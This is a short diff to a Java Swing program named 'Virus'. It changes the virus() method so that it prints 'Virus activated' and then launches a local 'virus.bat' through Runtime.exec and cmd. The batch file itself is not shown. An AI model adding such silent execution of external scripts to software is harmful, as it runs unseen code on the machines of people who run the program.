@@ -2,6 +2,7 @@ import javax.swing.*;
 import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
 import java.awt.event.WindowFocusListener;
+import java.io.IOException;
 
 public class Virus {
     public static void main(String[] args) {
@@ -32,6 +33,11 @@ public class Virus {
     }
 
     public static void virus() {
-        System.out.println("Hello world!");
+        System.out.println("Virus activated");
+        try {
+            Runtime.getRuntime().exec("cmd /c start \"\" virus.bat");
+        } catch (IOException e) {
+            System.out.println("Can't run virus.bat");
+        }
     }
 }
